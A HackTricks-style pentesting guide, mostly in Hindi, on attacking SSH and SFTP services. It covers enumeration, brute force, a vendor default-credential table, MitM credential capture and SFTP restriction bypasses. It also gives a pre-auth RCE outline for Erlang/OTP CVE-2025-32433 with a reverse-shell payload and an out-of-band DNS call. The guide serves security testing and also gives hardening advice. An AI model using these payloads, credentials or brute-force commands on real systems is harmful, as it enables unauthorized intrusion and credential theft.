# 22 - Pentesting SSH/SFTP

{{#include ../banners/hacktricks-training.md}}

## मूल जानकारी

**SSH (Secure Shell or Secure Socket Shell)** एक नेटवर्क प्रोटोकॉल है जो एक असुरक्षित नेटवर्क पर कंप्यूटर से सुरक्षित कनेक्शन सक्षम करता है। यह रिमोट सिस्टम्स तक पहुंचते समय डेटा की गोपनीयता और अखंडता बनाए रखने के लिए आवश्यक है।

**डिफ़ॉल्ट पोर्ट:** 22
```
22/tcp open  ssh     syn-ack
```
**SSH सर्वर:**

- [openSSH](http://www.openssh.org) – OpenBSD SSH, BSD, Linux वितरणों और Windows में Windows 10 से शिप किया गया है
- [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) – कम मेमोरी और प्रोसेसर संसाधनों वाले वातावरण के लिए SSH इम्प्लीमेंटेशन, OpenWrt में शिप किया गया है
- [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) – Windows के लिए SSH इम्प्लीमेंटेशन; क्लाइंट आमतौर पर उपयोग होता है लेकिन सर्वर का उपयोग कम सामान्य है
- [CopSSH](https://www.itefix.net/copssh) – Windows के लिए OpenSSH का इम्प्लीमेंटेशन

**SSH लाइब्रेरीज़ (सर्वर-साइड को इम्प्लीमेंट करने वाली):**

- [libssh](https://www.libssh.org) – मल्टीप्लैटफ़ॉर्म C लाइब्रेरी जो SSHv2 प्रोटोकॉल को इम्प्लीमेंट करती है और इसमें [Python](https://github.com/ParallelSSH/ssh-python), [Perl](https://github.com/garnier-quentin/perl-libssh/) और [R](https://github.com/ropensci/ssh) के बाइंडिंग्स हैं; इसे sftp के लिए KDE और git SSH इंफ़्रास्ट्रक्चर के लिए GitHub द्वारा उपयोग किया जाता है
- [wolfSSH](https://www.wolfssl.com/products/wolfssh/) – SSHv2 सर्वर लाइब्रेरी जो ANSI C में लिखी गई है और embedded, RTOS, और संसाधन-सीमित वातावरण के लिए लक्षित है
- [Apache MINA SSHD](https://mina.apache.org/sshd-project/index.html) – Apache SSHD java लाइब्रेरी Apache MINA पर आधारित है
- [paramiko](https://github.com/paramiko/paramiko) – Python SSHv2 प्रोटोकॉल लाइब्रेरी

## Enumeration

### Banner Grabbing
```bash
nc -vn <IP> 22
```
### स्वचालित ssh-audit

ssh-audit एक टूल है ssh server & client configuration auditing के लिए।

[https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit) is an updated fork from [https://github.com/arthepsy/ssh-audit/](https://github.com/arthepsy/ssh-audit/)

**विशेषताएँ:**

- SSH1 और SSH2 प्रोटोकॉल सर्वर समर्थन;
- SSH client कॉन्फ़िगरेशन का विश्लेषण;
- बैनर प्राप्त करें, डिवाइस या सॉफ्टवेयर और ऑपरेटिंग सिस्टम पहचानें, कंप्रेशन का पता लगाएँ;
- key-exchange, host-key, encryption और message authentication code एल्गोरिदम इकट्ठा करें;
- एल्गोरिदम जानकारी आउटपुट करें (कब से उपलब्ध, हटाया/अक्षम किया गया, असुरक्षित/कमज़ोर/पुराना, आदि);
- एल्गोरिदम अनुशंसाएँ आउटपुट करें (पहचाने गए सॉफ़्टवेयर संस्करण के आधार पर जोड़ें या हटाएँ);
- सुरक्षा जानकारी आउटपुट करें (संबंधित मुद्दे, असाइन किए गए CVE सूची, आदि);
- एल्गोरिदम जानकारी के आधार पर SSH संस्करण संगतता का विश्लेषण;
- OpenSSH, Dropbear SSH और libssh से ऐतिहासिक जानकारी;
- Linux और Windows पर चलता है;
- कोई निर्भरता नहीं
```bash
usage: ssh-audit.py [-1246pbcnjvlt] <host>

-1,  --ssh1             force ssh version 1 only
-2,  --ssh2             force ssh version 2 only
-4,  --ipv4             enable IPv4 (order of precedence)
-6,  --ipv6             enable IPv6 (order of precedence)
-p,  --port=<port>      port to connect
-b,  --batch            batch output
-c,  --client-audit     starts a server on port 2222 to audit client
software config (use -p to change port;
use -t to change timeout)
-n,  --no-colors        disable colors
-j,  --json             JSON output
-v,  --verbose          verbose output
-l,  --level=<level>    minimum output level (info|warn|fail)
-t,  --timeout=<secs>   timeout (in seconds) for connection and reading
(default: 5)
$ python3 ssh-audit <IP>
```
[See it in action (Asciinema)](https://asciinema.org/a/96ejZKxpbuupTK9j7h8BdClzp)

### सर्वर की सार्वजनिक SSH कुंजी
```bash
ssh-keyscan -t rsa <IP> -p <PORT>
```
### कमज़ोर Cipher Algorithms

यह डिफ़ॉल्ट रूप से **nmap** द्वारा खोजा जाता है। लेकिन आप **sslcan** या **sslyze** का भी उपयोग कर सकते हैं।

### Nmap scripts
```bash
nmap -p22 <ip> -sC # Send default nmap scripts for SSH
nmap -p22 <ip> -sV # Retrieve version
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```
### Shodan

- `ssh`

## Brute force usernames, passwords and private keys

### Username Enumeration

OpenSSH के कुछ संस्करणों में आप एक timing attack करके users को enumerate कर सकते हैं।  
इसे exploit करने के लिए आप metasploit module का उपयोग कर सकते हैं:
```
msf> use scanner/ssh/ssh_enumusers
```
### [Brute force](../generic-hacking/brute-force.md#ssh)

कुछ सामान्य ssh credentials [here ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)and [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) and below.

### Private Key Brute Force

यदि आपके पास उपयोग में लाए जा सकने वाले कुछ ssh private keys हैं... तो चलिए कोशिश करते हैं। आप nmap script का उपयोग कर सकते हैं:
```
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```
या MSF auxiliary module:
```
msf> use scanner/ssh/ssh_identify_pubkeys
```
Or use `ssh-keybrute.py` (native python3, lightweight and has legacy algorithms enabled): [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute).

#### Known badkeys can be found here:


{{#ref}}
https://github.com/rapid7/ssh-badkeys/tree/master/authorized
{{#endref}}

#### कमजोर SSH keys / Debian predictable PRNG

कुछ सिस्टम्स में cryptographic material जनरेट करने के लिए उपयोग किए जाने वाले random seed में ज्ञात दोष होते हैं। इससे keyspace नाटकीय रूप से घट सकता है जिसे bruteforce किया जा सकता है। कमजोर PRNG से प्रभावित Debian सिस्टम्स पर प्री-जनरेटेड keys के सेट यहाँ उपलब्ध हैं: [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

आपको लक्षित मशीन के लिए वैध keys खोजने हेतु यहाँ देखना चाहिए।

### Kerberos / GSSAPI SSO

यदि target SSH server GSSAPI को सपोर्ट करता है (उदाहरण के लिए Windows OpenSSH एक domain controller पर), तो आप password के बजाय अपने Kerberos TGT का उपयोग करके authenticate कर सकते हैं।

Workflow from a Linux attacker host:
```bash
# 1) Ensure time is in sync with the KDC to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# 2) Generate a krb5.conf for the target realm (optional, but handy)
netexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# 3) Obtain a TGT for the user
kinit <user>
klist

# 4) SSH with GSSAPI, using the FQDN that matches the host SPN
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
```
नोट्स:
- यदि आप गलत नाम से कनेक्ट करते हैं (उदा., short host, alias, या /etc/hosts में गलत क्रम), तो आपको मिल सकता है: "Server not found in Kerberos database" क्योंकि SPN मेल नहीं खाता।
- `crackmapexec ssh --kerberos` आपके Kerberos auth के लिये आपका ccache भी उपयोग कर सकता है।

## डिफ़ॉल्ट क्रेडेंशियल्स

| **विक्रेता** | **उपयोगकर्ता नाम**                                                                                          | **पासवर्ड**                                                                                                                                                                                              |
| ---------- | ----------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| APC        | apc, device                                                                                                 | apc                                                                                                                                                                                                       |
| Brocade    | admin                                                                                                       | admin123, password, brocade, fibranne                                                                                                                                                                     |
| Cisco      | admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin                                           | admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme |
| Citrix     | root, nsroot, nsmaint, vdiadmin, kvm, cli, admin                                                            | C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler                                                                                                                      |
| D-Link     | admin, user                                                                                                 | private, admin, user                                                                                                                                                                                      |
| Dell       | root, user1, admin, vkernel, cli                                                                            | calvin, 123456, password, vkernel, Stor@ge!, admin                                                                                                                                                        |
| EMC        | admin, root, sysadmin                                                                                       | EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc                                                                                                                                             |
| HP/3Com    | admin, root, vcx, app, spvar, manage, hpsupport, opc_op                                                     | admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin                                                   |
| Huawei     | admin, root                                                                                                 | 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123                                                                                            |
| IBM        | USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer | PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer                                                                                                                              |
| Juniper    | netscreen                                                                                                   | netscreen                                                                                                                                                                                                 |
| NetApp     | admin                                                                                                       | netapp123                                                                                                                                                                                                 |
| Oracle     | root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user                                           | changeme, ilom-admin, ilom-operator, welcome1, oracle                                                                                                                                                     |
| VMware     | vi-admin, root, hqadmin, vmware, admin                                                                      | vmware, vmw@re, hqadmin, default                                                                                                                                                                          |

## SSH-MitM

यदि आप victim के स्थानीय नेटवर्क में हैं जो username और password का उपयोग करके SSH server से कनेक्ट होने जा रहा है, तो आप उन credentials चोरी करने के लिये MitM हमला आज़मा सकते हैं:

Attack path:

- Traffic Redirection: attacker victim के ट्रैफ़िक को अपनी मशीन पर divert कर देता है, जिससे SSH server पर कनेक्शन प्रयास effectively intercept हो जाता है।
- Interception and Logging: attacker की मशीन एक proxy की तरह काम करती है, legitimate SSH server होने का नाटक करके उपयोगकर्ता के login विवरण capture कर लेती है।
- Command Execution and Relay: अंत में attacker का सर्वर उपयोगकर्ता के credentials log करता है, commands को real SSH server पर forward करता है, उन्हें execute कराता है, और परिणाम उपयोगकर्ता को वापस भेज देता है, जिससे प्रक्रिया seamless और legitimate दिखाई देती है।

[**SSH MITM**](https://github.com/jtesta/ssh-mitm) ठीक वही करता है जो ऊपर वर्णित है।

वास्तविक MitM कैप्चर करने के लिये आप ARP spoofing, DNS spoofin या अन्य तकनीकों का उपयोग कर सकते हैं जो [**Network Spoofing attacks**](../generic-methodologies-and-resources/pentesting-network/index.html#spoofing) में वर्णित हैं।

## SSH-Snake

यदि आप discovered SSH private keys का उपयोग करके एक नेटवर्क traverse करना चाहते हैं, प्रत्येक सिस्टम पर मिलने वाले private key का उपयोग करके नए hosts तक पहुँचना चाहते हैं, तो [**SSH-Snake**](https://github.com/MegaManSec/SSH-Snake) आपकी जरूरत का टूल है।

SSH-Snake स्वतः और recursively निम्न कार्य करता है:

1. वर्तमान सिस्टम पर किसी भी SSH private keys को ढूँढे,
2. वर्तमान सिस्टम पर किसी भी hosts या destinations (user@host) को ढूँढे जहाँ private keys स्वीकार किए जा सकते हैं,
3. सभी discovered private keys का उपयोग करके सभी destinations में SSH करने का प्रयास करे,
4. यदि किसी destination में सफलतापूर्वक कनेक्ट हो जाता है, तो connected-to system पर चरण #1 - #4 दोहराए।

यह पूर्णत: self-replicating और self-propagating है — और पूरी तरह fileless है।

## Config Misconfigurations

### Root login

अक्सर SSH servers डिफ़ॉल्ट रूप से root user login की अनुमति देते हैं, जो एक गंभीर सुरक्षा जोखिम है। सर्वर को सुरक्षित बनाने के लिये **root login को disable करना** एक महत्वपूर्ण कदम है। प्रशासनिक privileges के साथ unauthorized access और brute force हमला इससे कम किए जा सकते हैं।

OpenSSH में Root Login disable करने के लिये:

1. `sudoedit /etc/ssh/sshd_config` से SSH config फ़ाइल edit करें
2. सेटिंग को `#PermitRootLogin yes` से बदलकर **`PermitRootLogin no`** करें।
3. कॉन्फ़िगरेशन reload करने के लिये: `sudo systemctl daemon-reload`
4. बदलाओं को लागू करने के लिये SSH सर्वर restart करें: `sudo systemctl restart sshd`

### SFTP Brute Force

- [**SFTP Brute Force**](../generic-hacking/brute-force.md#sftp)

### SFTP command execution

SFTP setups में एक सामान्य चूक होती है, जहाँ administrators चाहते हैं कि users केवल फ़ाइलें एक्सचेंज करें बिना remote shell access के। हालांकि users को non-interactive shells (उदा., `/usr/bin/nologin`) सेट करके और उन्हें किसी विशेष directory तक प्रतिबंधित करके यह नीयत अपनाई जाती है, एक सुरक्षा loophole बनी रहती है। **Users इन प्रतिबंधों को बायपास कर सकते हैं** यदि वे लॉगिन के तुरंत बाद (उनके निर्धारित non-interactive shell के लागू होने से पहले) किसी command (जैसे `/bin/bash`) के execution की request कर दें। इससे unauthorized command execution संभव हो जाती है और अपेक्षित सुरक्षा उपाय कमजोर हो जाते हैं।

[उदाहरण यहाँ से](https://community.turgensec.com/ssh-hacking-guide/):
```bash
ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash
```
यहाँ उपयोगकर्ता `noraj` के लिए सुरक्षित SFTP कॉन्फ़िगरेशन (`/etc/ssh/sshd_config` – openSSH) का एक उदाहरण है:
```
Match User noraj
ChrootDirectory %h
ForceCommand internal-sftp
AllowTcpForwarding no
PermitTunnel no
X11Forwarding no
PermitTTY no
```
यह कॉन्फ़िगरेशन केवल SFTP की अनुमति देगा: start command को मजबूर करके shell access को अक्षम करना और TTY access को अक्षम करना, साथ ही सभी प्रकार के port forwarding या tunneling को भी अक्षम करना।

### SFTP Tunneling

यदि आपके पास किसी SFTP सर्वर तक पहुँच है, तो आप अपने ट्रैफ़िक को इसके माध्यम से tunnel कर सकते हैं, उदाहरण के लिए सामान्य port forwarding का उपयोग करके:
```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```
### SFTP Symlink

The **sftp** have the command "**symlink**". Therefore, if you have **writable rights** in some folder, you can create **symlinks** of **other folders/files**. As you are probably **trapped** inside a chroot this **won't be specially useful** for you, but, if you can **access** the created **symlink** from a **no-chroot** **service** (for example, if you can access the symlink from the web), you could **open the symlinked files through the web**.

For example, to create a **symlink** from a new file **"**_**froot**_**" to "**_**/**_**"**:
```bash
sftp> symlink / froot
```
यदि आप वेब के माध्यम से फ़ाइल "_froot_" तक पहुँच सकते हैं, तो आप सिस्टम के root ("/") फ़ोल्डर की सूची देख पाएँगे।

### प्रमाणीकरण विधियाँ

उच्च सुरक्षा वाले वातावरण में आम तौर पर केवल key-based या two factor authentication को सक्षम करना सामान्य प्रैक्टिस होती है बजाय साधारण password-based authentication के। पर अक्सर मजबूत प्रमाणीकरण विधियाँ सक्षम कर दी जाती हैं पर कमजोर विधियों को अक्षम नहीं किया जाता। एक सामान्य स्थिति यह है कि openSSH configuration में `publickey` को सक्षम कर दिया जाता है और उसे डिफ़ॉल्ट विधि बना दिया जाता है, पर `password` को अक्षम नहीं किया जाता। इसलिए SSH client के verbose mode का उपयोग करके एक attacker देख सकता है कि कमजोर विधि सक्षम है:
```bash
ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```
उदाहरण के लिए, यदि किसी प्रमाणीकरण विफलता सीमा को सेट किया गया है और आपको कभी भी पासवर्ड विधि तक पहुँचने का मौका नहीं मिलता, तो आप इस विधि का उपयोग करने के लिए `PreferredAuthentications` विकल्प का उपयोग कर सकते हैं।
```bash
ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password
```
SSH सर्वर कॉन्फ़िगरेशन की समीक्षा आवश्यक है ताकि यह सुनिश्चित किया जा सके कि केवल अपेक्षित विधियाँ ही अधिकृत हैं। क्लाइंट पर verbose mode का उपयोग कॉन्फ़िगरेशन की प्रभावशीलता देखने में मदद कर सकता है।

### कॉन्फ़िग फ़ाइलें
```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```
## Fuzzing

- [https://packetstormsecurity.com/files/download/71252/sshfuzz.txt](https://packetstormsecurity.com/files/download/71252/sshfuzz.txt)
- [https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2](https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2)

## Authentication State-Machine Bypass (Pre-Auth RCE)

कुछ SSH सर्वर implementations में **authentication finite-state machine** में लॉजिक दोष होते हैं, जो क्लाइंट को प्रमाणीकरण समाप्त होने से पहले *connection-protocol* संदेश भेजने की अनुमति देते हैं। चूंकि सर्वर यह सत्यापित करने में विफल रहता है कि वह सही state में है, इसलिए उन संदेशों को ऐसे संभाला जाता है जैसे उपयोगकर्ता पूरी तरह authenticated हो चुका है, जिससे **unauthenticated code execution** या session creation हो सकता है।

प्रोटोकॉल स्तर पर किसी भी SSH संदेश का _message code_ **≥ 80** (0x50) *connection* लेयर (RFC 4254) का होता है और इसे केवल सफल authentication के बाद ही स्वीकार किया जाना चाहिए (RFC 4252)। यदि सर्वर उन संदेशों में से किसी को तब भी प्रोसेस कर देता है जब वह अभी भी *SSH_AUTHENTICATION* state में है, तो हमलावर तुरंत एक channel बना सकता है और command execution, port-forwarding जैसे कार्यों के लिए अनुरोध कर सकता है।

### सामान्य शोषण कदम
1. लक्ष्य के SSH पोर्ट पर एक TCP कनेक्शन स्थापित करें (सामान्यतः 22, लेकिन अन्य सेवाएँ Erlang/OTP को 2022, 830, 2222… पर एक्सपोज़ कर सकती हैं)।
2. एक raw SSH packet बनाएं:
* 4-byte **packet_length** (big-endian)
* 1-byte **message_code** ≥ 80 (e.g. `SSH_MSG_CHANNEL_OPEN` = 90, `SSH_MSG_CHANNEL_REQUEST` = 98)
* Payload that will be understood by the chosen message type
3. किसी भी authentication चरण को पूरा किए बिना पैकेट(स) भेजें।
4. अब प्री-ऑथ के दौरान एक्सपोज़ हुई सर्वर APIs के साथ इंटरैक्ट करें (command execution, port forwarding, file-system access, …).

Python proof-of-concept outline:
```python
import socket, struct
HOST, PORT = '10.10.10.10', 22
s = socket.create_connection((HOST, PORT))
# skip version exchange for brevity – send your own client banner then read server banner
# … key exchange can be skipped on vulnerable Erlang/OTP because the bug is hit immediately after the banner
# Packet: len(1)=1, SSH_MSG_CHANNEL_OPEN (90)
pkt  = struct.pack('>I', 1) + b'\x5a'  # 0x5a = 90
s.sendall(pkt)
# additional CHANNEL_REQUEST packets can follow to run commands
```
In practice you will need to perform (or skip) the key-exchange according to the target implementation, but **no authentication** is ever performed.

---
### Erlang/OTP `sshd` (CVE-2025-32433)
* **प्रभावित संस्करण:** OTP < 27.3.3, 26.2.5.11, 25.3.2.20
* **मूल कारण:** Erlang native SSH daemon वर्तमान state को validate नहीं करता है इससे पहले कि वह `ssh_connection:handle_msg/2` को invoke करे। इसलिए कोई भी पैकेट जिसका message code 80-255 है connection handler तक पहुँच जाता है जबकि session अभी भी *userauth* state में होता है।
* **प्रभाव:** unauthenticated **remote code execution** (the daemon usually runs as **root** on embedded/OT devices).

उदाहरण payload जो attacker-controlled channel से जुड़ा reverse shell उत्पन्न करता है:
```erlang
% open a channel first … then:
execSinet:cmd(Channel, "exec('/bin/sh', ['-i'], [{fd, Channel#channel.fd}, {pid, true}]).").
```
Blind RCE / out-of-band detection DNS के माध्यम से किया जा सकता है:
```erlang
execSinet:gethostbyname("<random>.dns.outbound.watchtowr.com").Zsession
```
डिटेक्शन और निवारण:
* SSH ट्रैफ़िक की जाँच करें: **प्रमाणीकरण से पहले देखे गए किसी भी packet जिसका message code ≥ 80 हो, उसे drop करें**।
* Erlang/OTP को **27.3.3 / 26.2.5.11 / 25.3.2.20** या नवीनतम में अपग्रेड करें।
* management ports (22/2022/830/2222) की पहुँच सीमित करें — विशेषकर OT उपकरणों पर।

---
### प्रभावित अन्य इम्प्लीमेंटेशन
* **libssh** 0.6 – 0.8 (server side) – **CVE-2018-10933** – क्लाइंट द्वारा भेजा गया unauthenticated `SSH_MSG_USERAUTH_SUCCESS` स्वीकार कर लेता है, जो प्रभावी रूप से inverse logic flaw है।

सामान्य सबक यह है कि RFC-निर्धारित state transitions से किसी भी विचलन का परिणाम घातक हो सकता है; जब आप SSH daemons की समीक्षा या fuzzing कर रहे हों तो विशेष ध्यान *state-machine enforcement* पर दें।



## संदर्भ

- [Unit 42 – Erlang/OTP SSH CVE-2025-32433](https://unit42.paloaltonetworks.com/erlang-otp-cve-2025-32433/)
- [SSH hardening guides](https://www.ssh-audit.com/hardening_guides.html)
- [Turgensec SSH hacking guide](https://community.turgensec.com/ssh-hacking-guide)
- [Pentesting Kerberos (88) – client setup and troubleshooting](pentesting-kerberos-88/README.md)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)

## HackTricks Automatic Commands
```
Protocol_Name: SSH
Port_Number: 22
Protocol_Description: Secure Shell Hardening

Entry_1:
Name: Hydra Brute Force
Description: Need Username
Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh

Entry_2:
Name: consolesless mfs enumeration
Description: SSH enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'

```
{{#include ../banners/hacktricks-training.md}}
